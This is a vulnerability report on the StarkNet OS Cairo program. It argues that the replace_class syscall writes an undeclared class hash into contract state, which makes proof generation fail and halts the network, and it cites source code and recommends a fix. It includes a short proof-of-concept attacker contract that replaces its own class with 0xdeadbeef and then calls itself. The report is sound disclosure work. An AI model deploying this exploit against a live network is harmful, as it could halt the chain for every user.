### Title
Missing Declared-Class Validation in `execute_replace_class` Allows Undeclared Class Hash to Corrupt Contract State — (`File: crates/apollo_starknet_os_program/src/cairo/starkware/starknet/core/os/execution/syscall_impls.cairo`)

---

### Summary

The `execute_replace_class` syscall handler in the StarkNet OS program accepts any arbitrary `class_hash` value from the caller and writes it directly into `contract_state_changes` without verifying that the class hash has been declared (i.e., exists in `contract_class_changes`). This is the direct analog of the external report's pattern: a sub-component (the new class hash) is accepted at one validation layer without checking that it is registered at a lower layer. When the affected contract is subsequently called, `execute_entry_point` performs a `dict_read` on `contract_class_changes` for the undeclared hash, receives `0`, and then calls `find_element` with key `0` against the compiled class facts bundle. If no compiled class with hash `0` exists, `find_element` raises a Cairo assertion failure, making it impossible to generate a valid proof for the block, causing a network halt.

---

### Finding Description

In `execute_replace_class` (lines 877–916 of `syscall_impls.cairo`), the OS reads the requested `class_hash` from the syscall request and immediately writes it into `contract_state_changes` with no validation:

```cairo
let class_hash = request.class_hash;

// TODO(Yoni, 1/1/2026): Check that there is a declared contract class with the given hash.
local state_entry: StateEntry*;
%{ GetContractAddressStateEntry %}

tempvar new_state_entry = new StateEntry(
    class_hash=class_hash, storage_ptr=state_entry.storage_ptr, nonce=state_entry.nonce
);

dict_update{dict_ptr=contract_state_changes}(
    key=contract_address,
    prev_value=cast(state_entry, felt),
    new_value=cast(new_state_entry, felt),
);
```

The developer-inserted TODO comment at line 898 explicitly acknowledges the missing check. [1](#0-0) 

The downstream consumer of this state is `execute_entry_point` in `execute_entry_point.cairo`. When a contract whose class hash was replaced is subsequently called, the OS performs:

```cairo
let (compiled_class_hash: felt) = dict_read{dict_ptr=contract_class_changes}(
    key=execution_context.class_hash
);
...
let (compiled_class_fact: CompiledClassFact*) = find_element(
    array_ptr=compiled_class_facts_bundle.compiled_class_facts,
    elm_size=CompiledClassFact.SIZE,
    n_elms=compiled_class_facts_bundle.n_compiled_class_facts,
    key=compiled_class_hash,
);
``` [2](#0-1) 

If `class_hash` was never declared, `dict_read` returns `0` (the default uninitialized dict value). `find_element` is then called with `key=0`. Since no compiled class with hash `0` is present in the bundle, `find_element` raises a Cairo assertion failure. This makes it impossible to generate a valid STARK proof for the block.

The `execute_declare_transaction` function in `transaction_impls.cairo` shows the correct pattern: it writes to `contract_class_changes` only after verifying the class hash pre-image via `finalize_class_hash` and enforcing `prev_value=0` (declared only once). [3](#0-2) 

`execute_replace_class` performs no equivalent check against `contract_class_changes`. [4](#0-3) 

---

### Impact Explanation

**High — Network not being able to confirm new transactions (total network shutdown).**

If a block is constructed in which:
1. A contract calls `replace_class(undeclared_hash)`, and
2. That same contract is called again later in the same block (or the replaced class hash is referenced in any subsequent entry point execution),

then the OS program will fail to generate a valid proof for that block. No valid proof means the block cannot be finalized on L1, and the sequencer cannot advance the chain. This constitutes a total network halt for the duration that the invalid block remains unresolved.

---

### Likelihood Explanation

Any unprivileged contract deployer can write a contract that calls the `replace_class` syscall with an arbitrary felt value as the class hash. The `replace_class` syscall is a standard, publicly accessible syscall available to all Sierra contracts. No privileged role or special access is required. The attacker only needs to:
1. Deploy a contract.
2. Have that contract call `replace_class` with a non-declared hash.
3. Trigger a second call to that contract within the same block (e.g., via a chained `call_contract` syscall from the same transaction, or by submitting a second transaction in the same block targeting the same contract).

The TODO comment in the production code confirms this is a known, unimplemented guard. [5](#0-4) 

---

### Recommendation

Before writing the new class hash into `contract_state_changes`, `execute_replace_class` must verify that the class hash is present in `contract_class_changes`. Specifically, perform a `dict_read` on `contract_class_changes` with the requested `class_hash` and assert the returned `compiled_class_hash` is non-zero (i.e., the class has been declared). This mirrors the validation already enforced in `execute_entry_point` at the point of use, but must be moved to the point of assignment in `execute_replace_class`. [6](#0-5) 

---

### Proof of Concept

**Attack contract (Sierra/Cairo 1.0 pseudocode):**
```rust
#[starknet::contract]
mod Attacker {
    #[external(v0)]
    fn attack(ref self: ContractState) {
        // Step 1: Replace own class with an arbitrary undeclared hash.
        // 0xdeadbeef is not declared in contract_class_changes.
        starknet::replace_class_syscall(0xdeadbeef_felt252).unwrap();

        // Step 2: Call self again — triggers execute_entry_point with class_hash=0xdeadbeef.
        // dict_read(contract_class_changes, 0xdeadbeef) → 0
        // find_element(..., key=0) → Cairo assertion failure
        // OS proof generation fails → block cannot be proven → network halt.
        let self_addr = starknet::get_contract_address();
        starknet::call_contract_syscall(self_addr, selector!("attack"), array![].span()).unwrap();
    }
}
```

**Execution trace in the OS:**

1. `execute_replace_class` is called with `class_hash = 0xdeadbeef`. [1](#0-0) 
2. No check against `contract_class_changes` is performed (the TODO is unimplemented).
3. `contract_state_changes[attacker_address].class_hash` is set to `0xdeadbeef`.
4. The inner `call_contract` triggers `execute_entry_point` with `execution_context.class_hash = 0xdeadbeef`. [2](#0-1) 
5. `dict_read(contract_class_changes, 0xdeadbeef)` returns `0`.
6. `find_element(..., key=0)` fails — no compiled class with hash `0` exists.
7. OS program aborts. Block proof cannot be generated. Network halts.

### Citations

**File:** crates/apollo_starknet_os_program/src/cairo/starkware/starknet/core/os/execution/syscall_impls.cairo (L877-916)
```text
// Replaces the class.
func execute_replace_class{
    range_check_ptr,
    syscall_ptr: felt*,
    contract_state_changes: DictAccess*,
    revert_log: RevertLogEntry*,
}(contract_address: felt) {
    alloc_locals;
    let request = cast(syscall_ptr + RequestHeader.SIZE, ReplaceClassRequest*);

    // Reduce gas.
    let success = reduce_syscall_gas_and_write_response_header(
        total_gas_cost=REPLACE_CLASS_GAS_COST, request_struct_size=ReplaceClassRequest.SIZE
    );
    if (success == FALSE) {
        // Not enough gas to execute the syscall.
        return ();
    }

    let class_hash = request.class_hash;

    // TODO(Yoni, 1/1/2026): Check that there is a declared contract class with the given hash.
    local state_entry: StateEntry*;
    %{ GetContractAddressStateEntry %}

    tempvar new_state_entry = new StateEntry(
        class_hash=class_hash, storage_ptr=state_entry.storage_ptr, nonce=state_entry.nonce
    );

    dict_update{dict_ptr=contract_state_changes}(
        key=contract_address,
        prev_value=cast(state_entry, felt),
        new_value=cast(new_state_entry, felt),
    );

    assert [revert_log] = RevertLogEntry(selector=CHANGE_CLASS_ENTRY, value=state_entry.class_hash);
    let revert_log = &revert_log[1];

    return ();
}
```

**File:** crates/apollo_starknet_os_program/src/cairo/starkware/starknet/core/os/execution/execute_entry_point.cairo (L154-166)
```text
    let (compiled_class_hash: felt) = dict_read{dict_ptr=contract_class_changes}(
        key=execution_context.class_hash
    );

    // The key must be at offset 0.
    static_assert CompiledClassFact.hash == 0;
    let compiled_class_facts_bundle = block_context.os_global_context.compiled_class_facts_bundle;
    let (compiled_class_fact: CompiledClassFact*) = find_element(
        array_ptr=compiled_class_facts_bundle.compiled_class_facts,
        elm_size=CompiledClassFact.SIZE,
        n_elms=compiled_class_facts_bundle.n_compiled_class_facts,
        key=compiled_class_hash,
    );
```

**File:** crates/apollo_starknet_os_program/src/cairo/starkware/starknet/core/os/execution/transaction_impls.cairo (L814-819)
```text
    // Declare the class hash.
    // Note that prev_value=0 enforces that a class may be declared only once.
    assert_not_zero(compiled_class_hash);
    dict_update{dict_ptr=contract_class_changes}(
        key=[class_hash_ptr], prev_value=0, new_value=compiled_class_hash
    );
```
